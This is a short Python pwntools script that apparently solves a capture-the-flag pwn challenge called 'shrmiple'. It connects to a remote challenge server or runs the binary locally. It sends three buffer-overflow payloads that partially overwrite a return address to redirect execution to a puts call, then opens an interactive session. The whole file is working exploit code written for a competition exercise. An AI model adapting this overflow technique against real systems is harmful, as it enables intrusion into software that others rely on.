#!/usr/bin/env python3

from pwn import *

exe = ELF("./shrmiple")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="b *main+253")
    else:
        r = remote("chal.competitivecyber.club", 8884)

    return r


def main():
    r = conn()

    CALL_PUTS  = 0x0000000000401282

    addr = p32(CALL_PUTS).replace(b'\x00',b'')
    r.sendlineafter(b">> ", b'C'*38 + addr + b'AA\x00')
    r.sendlineafter(b">> ", b'C'*38 + addr + b'A\x00')
    r.sendlineafter(b">> ", b'C'*38 + addr + b'\x00')



    r.interactive()


if __name__ == "__main__":
    main()
